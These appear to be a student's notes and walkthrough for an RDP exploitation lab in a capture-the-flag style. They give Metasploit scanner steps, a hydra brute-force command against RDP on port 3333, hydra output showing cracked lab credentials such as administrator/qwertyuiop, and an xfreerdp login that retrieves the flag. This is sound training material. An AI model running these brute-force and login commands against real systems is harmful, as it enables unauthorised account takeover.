#### RDP 
	- Remote Desktop Protocol
	- GUI for remote sessions
	- TCP 3389, or any TCP port
	- Authentication with windows account
	- Brute force for user credentials/list



#### Tools
msfconsole
hydra
xfreerdp

#### Commands

With msfconsole, see if rdp is running
```
msfconsole
search rdp_scanner
use auxiliary/scanner/rdp/rdp_scanner
show options
set RHOSTS target_ip
set RPORT rdp_port
exploit
```

Brute force rdp with Hydra
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://target_ip
-s 3333
```

Connect to rdp with xfreerdp
```
xfreerdp /u:username /p:password /v:target_ip:port
```


A Kali GUI machine and a target machine running a vulnerable RDP service are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target). 

Your task is to fingerprint the running RDP service and its valid port using the tools available on the Kali machine and then exploit the vulnerability using the appropriate method.

**Note:** rdesktop will not work on this setup as it does not support NLA. Please use xfreerdp to connect to the RDP server.

**Objective:** Exploit the application and retrieve the flag!

Note: rdesktop will not work on this setup as it does not support NLA. Please use xfreerdp to connect to the RDP server.

Instructions:* Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y. * The IP address of the target machine is mentioned in the file “/root/Desktop/target” * Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1 * Dictionaries to use: + /usr/share/metasploit-framework/data/wordlists/common_users.txt + /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

```
nmap -p- -sS -sV -T 4 -v 10.4.23.196 

135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3333/tcp  open  ssl/dec-notes?
5985/tcp  open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc          Microsoft Windows RPC
49153/tcp open  msrpc          Microsoft Windows RPC
49154/tcp open  msrpc          Microsoft Windows RPC
49155/tcp open  msrpc          Microsoft Windows RPC
49164/tcp open  msrpc          Microsoft Windows RPC
49175/tcp open  msrpc          Microsoft Windows RPC
```

Brute force rdp service
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -s 3333 10.4.23.196 rdp 

[3333][rdp] host: 10.4.23.196   login: demo   password: victoria
[3333][rdp] host: 10.4.23.196   login: auditor   password: elizabeth
[3333][rdp] host: 10.4.23.196   login: sysadmin   password: samantha
[3333][rdp] host: 10.4.23.196   login: administrator   password: qwertyuiop

```

```
xfreerdp /u:Administrator  /p:qwertyuiop /v:10.4.23.196:3333

port-number-3333
```